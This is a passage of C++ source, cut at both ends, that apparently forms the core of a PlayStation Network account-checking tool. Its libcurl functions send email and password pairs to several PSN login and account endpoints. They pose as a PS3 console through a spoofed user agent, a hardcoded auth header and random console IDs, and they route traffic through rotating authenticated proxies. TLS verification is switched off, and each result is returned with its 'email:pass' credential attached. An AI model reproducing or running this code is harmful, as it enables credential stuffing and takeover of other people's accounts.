			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "PS3Application libhttp/4.8.7-000 (CellOS)");
			curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");

			curl_easy_setopt(curl, CURLOPT_URL, "https://native-ps3.np.ac.playstation.net/native/reg/setCred.action");

			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{

				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);

			res = curl_easy_perform(curl);

		
			
			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

		
			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();

			if (res != CURLE_OK)
			{
				return (char*)"UNKNOWN ERROR";
			}
			
			return strres;
		}
		else
		{
			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);
			return (char*)"UNKNOWN ERROR";
		}
	
	}
	catch (...)
	{

		curl_global_cleanup();
		return (char*)"UNKNOWN ERROR";
	}
}

char* RegMethod2(char* e, char* p, char* c, char* px, int pxt)
{
	/*
	int state = 0;
	char* gStrResult = new char[8192];
	return ConfigReg(e, p, c, px, pxt, gStrResult, &state);


	return NULL;
	*/
	return ConfigReg2(e, p, c, px, pxt);
}



char* crssConfig(char* e, char* p, char* c, char* px, int pxt) // 2021.03.31-------------update
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "version=25&username=" + email + "&password=" + pass + "&consoleId=" + console;
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			srand(time(NULL));

			struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
			generate_unique_framework(FRAMEWORK);
			uint64_t outlen;

			uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
			uint8_t idps[0x10];

			choose_rand_idps(idps, ps3_ids);



			//char post[50000];

			//sprintf_s(post, par.c_str());

			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: native-ps3.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "User-Agent: PS3Application libhttp/4.8.7-000 (CellOS)");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: gzip");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "Authorization: Basic ZmluYWw6TXJEOUt1VFE=");
			chunk = curl_slist_append(chunk, "X-MediaInformation: PS3/1920x1080");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
			chunk = curl_slist_append(chunk, "Accept:");


			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");



			curl_easy_setopt(curl, CURLOPT_URL, "https://native-ps3.np.ac.playstation.net/native/store/crSess.action");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			if (strings.size() > 0)
				strings.~vector();

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Lediatio Lunto Ritna");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//char nline[5000];
			//res = curl_easy_setopt(curl, CURLOPT_COOKIELIST, nline);

			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			//	curl = curl_easy_init();
				/*	uint64_t outlen2;
					char* decodeast = base64_encode((const unsigned char*)response_string.c_str(), response_string.length(), &outlen2);

					response_string = decodeast;*/

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();
// 			if (FRAMEWORK != NULL)
// 						free(FRAMEWORK);
			if (res != CURLE_OK)
			{

				return (char*)"UNKNOWN ERROR";
			}
			/*curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);*/
			return strres;
		}
		else
		{
			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);
			return (char*)"UNKNOWN ERROR";
		}
		//curl = curl_easy_init();
		//uint64_t outlen;
		//char* decodeast = base64_encode((const unsigned char*)response_string.c_str(), response_string.length(), &outlen);

		//response_string = decodeast;
		//
		//string combine = "______________________";
		//string contentstring = header_string + response_string;
		//string resultstring = header_string + combine + response_string + combine + contentstring;

		//auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 8));
		//

		//sprintf_s(strres, header_string.length() + combine.length() + response_string.length() + combine.length() + contentstring.length()+4, "%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),  combine.c_str(),contentstring.c_str(), res);


		//curl_global_cleanup();

		//mut.unlock();
		//fctPointer(strres);
		//return strres;
	}
	catch (...)
	{

		curl_global_cleanup();
		return (char*)"UNKNOWN ERROR";
	}
}


char* crssMethod(char* e, char* p, char* c, char* px, int pxt)
{
	
	/*2021.03.31----update
	int state = 0;
	char* gStrResult = new char[8192];
	return crssConfig(e, p, c, px, pxt, gStrResult, &state);

	return NULL;
		*/
	return crssConfig(e, p, c, px, pxt);
}


char* bindConfig(char* e, char* p, char* c, char* px, int pxt)//2021.03.31.------update
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "version=25&username=" + email + "&password=" + pass + "&consoleId=" + console;
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			srand(time(NULL));

			struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
			generate_unique_framework(FRAMEWORK);
			uint64_t outlen;

			uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
			uint8_t idps[0x10];

			choose_rand_idps(idps, ps3_ids);



			//char post[50000];

			//sprintf_s(post, par.c_str());

			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: native-ps3.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "User-Agent: PS3Application libhttp/4.8.7-000 (CellOS)");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: gzip");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "Authorization: Basic ZmluYWw6TXJEOUt1VFE=");
			chunk = curl_slist_append(chunk, "X-MediaInformation: PS3/1920x1080");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
			chunk = curl_slist_append(chunk, "Accept:");


			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");


			curl_easy_setopt(curl, CURLOPT_URL, "https://native-ps3.np.ac.playstation.net/native/reg/bindAccount.action");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			if (strings.size() > 0) strings.~vector();

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "PS3Application libhttp/4.8.7-000 (CellOS)");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//char nline[5000];


			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();

			// 			if (FRAMEWORK != 0)
			// 				free(FRAMEWORK);

			if (res != CURLE_OK)
			{

				return (char*)"UNKNOWN ERROR";
			}
			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}
	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}


char* bindMethod(char* e, char* p, char* c, char* px, int pxt)
{
	//2021.03.31
// 	int state = 0;
// 	char* gStrResult = new char[8192];
// 	return bindConfig(e, p, c, px, pxt, gStrResult, &state);
// 
// 	return NULL;
	return bindConfig(e, p, c, px, pxt);
}



char* capConfig(char* e, char* p, char* c, char* px, int pxt) // 2021.03.31------update
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "loginid=" + email + "&password=" + pass + "&consoleId=" + console + "&productid=UP9000-NPUC97142_00-0000000000000000";
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			

			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: commerce.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "User-Agent: Legium pro Britania");
			chunk = curl_slist_append(chunk, "X-I-5-DRM-Version: 1.0");



			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			



			curl_easy_setopt(curl, CURLOPT_URL, "https://commerce.np.ac.playstation.net/cap.m");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			if (strings.size() > 0)
				strings.~vector();

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "PS3Application libhttp/4.8.7-000 (CellOS)");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//char nline[5000];


			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();

			//2021.03.31
// 			if (FRAMEWORK != NULL)
// 				free(FRAMEWORK);

			if (res != CURLE_OK)
			{

				return (char*)"UNKNOWN ERROR";
			}
			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}
	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}


char* capMethod(char* e, char* p, char* c, char* px, int pxt)
{	
	/* 2021.03.31-----update
	int state = 0;
	char* gStrResult = new char[8192];
	return authConfig(e, p, c, px, pxt, gStrResult, &state);

	return NULL;
	*/
	return capConfig(e, p, c, px, pxt);
}


char* kdpConfig(char* e, char* p, char* c, char* px, int pxt) // 2021.03.31------update
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "loginid=" + email + "&password=" + pass + "&consoleId=" + console + "&productid=UP9000-NPUC97142_00-0000000000000000";
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			
			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", (int)strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: commerce.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "User-Agent: Legium pro Britania");
			chunk = curl_slist_append(chunk, "X-I-5-DRM-Version: 1.0");



			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			



			curl_easy_setopt(curl, CURLOPT_URL, "https://commerce.np.ac.playstation.net/kdp.m");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			if (strings.size() > 0)
				strings.~vector();

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "PS3Application libhttp/4.8.7-000 (CellOS)");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//char nline[5000];


			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
